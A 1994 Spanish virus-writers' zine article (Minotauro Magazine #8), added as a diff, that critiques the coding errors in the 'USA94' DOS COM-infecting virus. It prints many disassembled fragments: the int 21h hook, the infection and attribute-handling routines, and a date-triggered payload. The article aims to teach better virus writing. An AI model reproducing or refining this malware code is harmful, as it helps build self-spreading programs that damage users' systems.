@@ -1,0 +1,331 @@
+Minotauro Magazine Issue #8:
+
+       		         Produccion Nacional: USA 1994
+	                    (Mi Lamentable Vibrion)
+
+     Ok, la seccion Produccion Nacional hemos decidido discontinuarla ya que 
+los virus nacionales que quedan son o bien directamente malos, o bien buenos, 
+pero nuestros :-) por lo que publicarlos en esa seccion seria poco objetivo. 
+Por lo tanto hemos decidido que igual podemos encontrar un aspecto positivo 
+de publicar virus truchos; mostrar lo que NO hay que hacer.
+
+     En primer lugar quisiera aclarar que esto no es ninguna rencilla 
+personal con los autores de los virus que vamos a publicar, (la mayoria de 
+los cuales ni siquiera conocemos) sino sencillamente mostrar algunos 
+descuidos, detalles estupidos la mayoria de las veces, pero a veces 
+terribles errores "conceptuales". Vale aclarar que obviamente, preferimos 
+suponer que los autores de los virus estaban en una etapa de aprendizaje 
+cuando hicieron estos virus, y que ahora, o en el futuro, aprenderan cosas 
+que son obvias para alguien que sabe programar.
+
+     La seccion consistira de las siguientes partes; primero una sencilla 
+descripcion del virus, luego todos los errores de programacion explicados 
+detalladamente uno por uno, con ejemplos, y por ultimo el source 
+desensamblado del virus, para el que tenga ganas de tenerlo completo, y para
+no dejar de alimentar las areas "Virus Sources" de las bbs argentinas, que se 
+han visto muy favorecidas por la seccion de Produccion Nacional :-). 
+
+     El virus de hoy es uno que a pesar de todo, se encuentra mas o menos 
+disperso por las BBS, y es de un autor que tenemos la suerte de haber 
+conocido, Anubis. Su virus USA94 es un sencillo infector de COM residente, 
+encriptado (con encripcion constante).
+
+% Erratas, descuidos, errores %
+
+1-El primer error que encontramos con bastante frecuencia en el virus de 
+Anubis, es que le gusta cargar los registros varias veces con los mismo 
+valores. Esto en realidad no esta "mal" pero considerando que un virus 
+tiene que ser tan chico como sea posible, siempre es preferible cargar uno 
+solo registro, y a los otros cargarlos con ese. Por ejemplo:
+
+     mov  di,realstart-vstart+100h
+     mov  si,realstart-vstart+100h
+
+Seria mejor:
+
+     mov di, (sanata)
+     mov si, di
+
+Esto ahorraria muchos bytes en el virus de Anubis.
+
+2-Otro error, este quiza mas entendible que el anterior, es que Anubis 
+parece no recordar que es lo que tenia en los registros de segmento. Llega 
+a ser muy curioso como Anubis carga en DS el valor de CS varias veces en la 
+misma rutina, en circunstancias donde el flujo de control no podria 
+divergerse hacia otro lado.
+
+Por ejemplo:
+
+     mov  ah,4ah           	       ; fixear el bloque de memoria
+     push cs
+     pop  es
+     int  21h
+     mov  ax,3521h 		       ; getint21
+     int  21h
+     mov  ds:[oldint21-vstart+100h],bx ; save vector
+     mov  ds:[oldint21-vstart+102h],es
+     mov  ax,2521h
+     push cs                          ; 2 bytes totalmente al pedo 
+     pop  ds
+     mov  dx,newint21-vstart+100h
+     int  21h
+
+3- Otro error bastante antiestetico, y comun entre los principiantes, es no 
+usar lodsb. Instrucciones como esta o como stosb, o movsb, resultan 
+complicadas para los que no saben muy bien en donde estan parados, como 
+Anubis, y por lo tanto optan por utilizar sus equivalentes: mov al, [si], 
+etc. Usar combinaciones parecidas (mov bl, [di]) para escanear o copiar 
+codigo o datos solo convienien cuando estamos haciendo cosas muy especificas.
+
+4- Algo sumamente c¢mico, es como hace el compa¤ero Anubis (bueno, soy 
+comunista, pero shhhh..) para armar el jump al virus que luego va a escribir 
+al hoste: 
+
+	mov     si,offset fixjmp-vstart+100h
+	mov     byte ptr [si],0E9h      ; que hac‚s viejo! :)..
+	mov     ax,ds:[fsize-vstart+100h]
+	sub     ax,0003                 ; calcula el jump al virus
+	mov     [si+01],ax
+	mov     byte ptr [si+03],55h 	; marca de infecci¢n. Pero ponela
+
+como pueden ver, lo que hace es LITERALMENTE :) armar byte a byte todo
+el jump, pero poni‚ndole el opcode del jmp near 0E9h, y hasta poni‚ndole
+el byte que usa como marca de infecci¢n!, y esto lo hace con cada 
+infecci¢n!, perdiendo bytes y tiempo de ejecuci¢n, cuando tranquilamente
+podr¡a tener esos dos bytes fixeados en el c¢digo del virus..
+
+njmp		db		0e9h,0,0,55h
+				
+y hacer simplemente... ( en pseudo-pseudo c¢digo :) )
+
+	mov si,offset njmp
+	mov ax,hoste_size
+	sub ax,3
+	mov [si+1],ax
+
+como ven, cambia radicalmente la cosa, y es como deber¡a hacerlo.
+Esto es un grave error conceptual, muestra de un desconocimiento del
+lenguaje assembler en s¡, y tomando en cuenta que he visto virus de
+Anubis que son modificaciones de los creados por el LAVI, podemos
+deducir (elemental mi querido watson..) que anubis esta dando sus
+primeros pasos con el assembler, y los esta dando sobre el tema
+virus, usando el viejo y nunca bien ponderado cut & paste (bueno, de
+alguna forma hay que aprender..). 
+
+5- Otra cosa curiosa y poco ¢ptima es la siguiente rutina que se
+encuentra al principio del handler del virus de la int 21h:
+
+					; en DS:DX -> filename
+	mov     bx,dx 			; a buscar el punto..
+	mov     si,0			; que feo, oiste del xor si,si? :)
+look4dot:
+	mov     ah,[bx]			; bueno, aca no te critico nada :)
+	cmp     ah,'.'			; pero era mejor cmp b[bx],'.' :)
+	jz      foundit
+	inc     bx
+	inc     si
+	cmp     si,32h
+	jz      isnotcom
+	jmp     look4dot
+
+esta rutina, la usa para buscar la extensi¢n del file que se va a ejecutar,
+y actuar seg£n lo que sea (si es .COM lo infecta etc.).
+
+ahora viene el desastre, en este punto, anubis, una vez encontrado el
+puntito, BX lo tiene apuntando al '.', o sea que ya encontr¢ dentro de
+DS:DX en que posici¢n esta el '.' (la extensi¢n), entonces, procede a
+comprobar si el file es un .COM ...
+
+foundit:
+	cmp     word ptr [bx+01],"OC"   ; a ver si es un .COM ...
+	jz      shitcmp			; me aguanto
+	cmp     word ptr [bx+01],"oc"
+	jz      shitcmp
+	jmp     isnotcom
+shitcmp:
+	cmp     byte ptr [BX+03],'M'    ; sigue con lo mismo..
+	jz      iscom
+	cmp     byte ptr [BX+03],'m'
+	jz      iscom
+isnotcom:
+	call    abort                    ; guau, un call :).. no es un COM.
+
+
+listo, compar¢ si es un .COM, si no lo es aborta; pero si lo es, procede
+a comparar si el file termina en "ND" (vaya a saber que busca, no
+tengo idea, tal vez el SCAND :)), pero el desastre que hace, es que teniendo
+en BX el offset en el que est  el puntito, el querido Anubis, procede
+a hacer Tooooooooda la b£squeda del mismo otra vez, duplicando c¢digo,
+perdiendo tiempo, y adem s demostrando sus escasas (por no decir nulas)
+habilidades en el lenguaje assembler.  
+
+vean y lloran.. (los puedo escuchar...):
+	
+iscom:
+	mov     bx,dx
+	mov     si,0			; otra vez!, XOR SI,SI, XOR SI,SI!
+look4dot2:
+	cmp     byte ptr [bx],'.'	; busca el puntito de nuevo.. :)
+	jz      foundit2		; ya lo hab¡as encontrado che :)..
+	inc     bx
+	INC     si
+	cmp     si,32h
+	jz      goon
+	jmp     look4dot2
+foundit2:
+	cmp     word ptr [bx-02],"DN"	; que ser  esto..
+	jnz     ohgodwhyme		
+	call    abort
+ohgodwhyme:
+	cmp     word ptr [bx-02],"dn"
+	jnz     goon
+
+	call    abort
+
+en fin...
+
+6- y van... Anubis, ademas de ser un miembro m s de la logia
+Luck Martins (adoradores del cut & paste/rip, use & claim that is
+mine y del nunca bien ponderado 100% asm), es un entusiasta lector,
+y le encanta leer revistas de virus tanto como a borges, pero el
+problema es que entiende a las primeras tanto como al segundo, entonces
+de ah¡ surge su confusi¢n pobre.. miren esta rutina de infecci¢n..
+
+
+	mov     ax,4300h			; toma atributos del file
+	int     21h
+	mov     cs:[oldattr-vstart+100h],cx 		; salvarlos
+	mov     byte ptr cs:[error-vstart+100h],0	; variable de error
+
+como bien ley¢ anubis en alguna minotauro, 40hex o nuke infojournal, el
+va a proceder a instalar su propio handler de la i24 para que ante cualquier
+error no le salte el famoso retry,abort,fail,suicidarse etc. ...
+
+	mov     ax,3524h		 	; get error handler
+	int     21h
+	push    bx	
+	push    es
+	mov     cs:[oldint24-vstart+100h],bx	; guarda el vector i24
+	mov     cs:[oldint24-vstart+2+100h],es
+	mov     ax,2524h 			; set dumb controler
+	push    ds
+	push    dx
+	mov     dx,newint24-vstart+100h		; dumb i24 handler
+	push    cs
+	pop     ds
+	int     21h
+
+listo, ahora ante cualquier error, el lo tiene controlado, entonces 
+procede a sacarle los atributos al file...
+
+	mov     ax,4301h 			; set attr. to 0
+	mov     cx,0				; xor cx,cx por favor!!
+	pop     dx
+	pop     ds
+	mov     cs:[nameptr-vstart+100h],dx     ; guarda DS:DX -> filename
+	mov     cs:[nameptr-vstart+102h],ds
+	int     21h
+
+b rbaro, muy bien Anubis, muy bien, ves que aprend‚s, me equivoque, me
+arrepiento de todo lo que te dije a lo largo de la nota, me apresur‚,
+vos si que sab^&%^&*!@*.. no, no, para, que es esto?. pero es en serio?..
+no, para.. que haces?.. a ver..
+
+	mov     ax,2524h 			; lo resetea al nombre??? ????
+	pop     es      			; tiene un pedo en la cabeza
+	pop     bx				; este chab¢n..
+	int     21h
+	cmp     byte ptr cs:[error-vstart+100h],1 ; controla la variable 
+	jnz     solame				  ; de error
+	call    abort
+
+NOoo viejo!, que haces!, primero, para que volviste a poner ahora el
+handler si lo podr¡as seguir usando, y adem s... DS:DX est  apuntando
+al file a infectar Anubis!, que haces!!!, muy bien, al pedir el vector
+de la i24 hiciste el push bx, es, pero te olvidaste que la funcion 25h
+para setear el vector de la i24 te lo pide en DS:DX hombre!, y por mas
+que hagas el pop es,bx tenes que pasarlo a DS:DX!, tendr¡a que ser un
+pop ds,dx !!!, bueno, basta.. ya no puedo mas, un m‚dico a la derecha..
+(cualquier semejanza con la vida real, sepa entenderse.. :))
+
+solame:
+	mov     ah,3Dh 				  ; lameissimus
+	mov     al,02h				  ; juaaaaa :)
+	pushf
+	call    dword ptr cs:[oldint21-vstart+100h] ; llama i21 original
+						    ; para que no s‚ :)
+						    ; si esta llamada no
+						    ; no la intercept s
+						    ; master..
+
+y seguidito a la anterior master piece.. anubis, vos no est s interceptando
+a la funci¢n 3dh de la i21, asi que me quer‚s explicar para que rec¢rcholis
+haces un call far a la i21 original????. Ya me imagino la respuesta.. :)
+
+7- Si, llegamos.. llegamos y llegamos... yo sab¡a que algo iba a revertir
+mis tendencias suicidas, yo sab¡a, sabio que iba a ser un sabio, sus
+palabras tal vez, pero no.. fue Anubis, podr¡a llamarlo sabio, pero no,
+lo considero un fil¢sofo, el me ha dado una raz¢n para seguir viviendo,
+la raz¢n.. la raz¢n... conseguir tu direcci¢n anubis, porque es increible
+lo que viene a continuaci¢n.. 
+
+aca anubis chequea si es el 17 de junio, en caso afirmativo, procede
+a desatar el terrible poder destructivo de su virus..
+
+	mov     ah,2ah                  ; pide la fecha
+	int     21h
+	cmp     dh,06                   ; verifica si es junio..
+	jnz     isnotdate
+	cmp     dl,17                   ; 17 de junio?..
+	jnz     isnotdate
+	call    active                  ; se activa si es 17 de junio.
+
+
+luego de gastar 3 bytes innecesariamente (algo com£n en el)..
+
+active:
+	jmp     crack
+
+string2         db                      "-USA 94-",0 ; file
+
+sisisisisi!, llegamos, aqui viene el playload del virus Usa '94,
+beware! Usa '94 is here to stay!.. cuidado.. veamos..
+
+crack:
+	; ???????? 
+	push    cx
+	push    ax
+	push    dx
+	mov     dx,ds:[0101h]           ; y este enchastre viejo? :)..
+	add     dx,0103h
+	add     dx,string2-vstart+100h
+	sub     dx,0100h
+	mov     cx,8h
+	mov     ah,3Ch                  ; crea el archivo..
+	int     21h
+	pop     dx                      ; y aca muere el playload ;)..
+	pop     ax
+	pop     cx
+
+brbrbrbrb, ehh.... corky!.. no anubis.. que es esto!?, que pas¢ anubis?,
+ten¡as excursi¢n en la salita verde y no tuviste tiempo de calcar el
+virus?, que pas¢? que es esto!?, queres crear el file "-USA 94-", y
+despu‚s???, te moris.. te vas, chau, adios.. bueno, si tu intenci¢n
+era crear el file y colgar la m quina, te sali¢ perfecto.. :)
+
+
+Bueno, mi salud mental da hasta ac , mas no puedo, el virus de anubis
+esta lleno, pero lleno :), de errores, de cosas absurdas e incomprensibles,
+como chequear para saber si el virus de desencript¢ bien (??), cosas
+realmente incre¡bles. Pensar que despu‚s esta es la misma gente que
+dice que no quiere distribuir el source de sus virus, ahora sabes por
+qu‚ :), y como para rematar, al haber terminado de desensamblar el
+USA '94, nos dimos cuenta que el virus es casi una r‚plica de un
+virus hecho con el LAVI, de ahi que algunos antivirus lo confundan
+con virus hechos por este creador, asi que, degradante y horrible
+anubis, no hay mas nada que agregar.
+
+Espero que hayan aprendido lo que NO hay que hacer, y sepan rechazar
+la tentaci¢n de la logia Luck Martins (100% asm).
+ 
+				- That's All, So long. - 
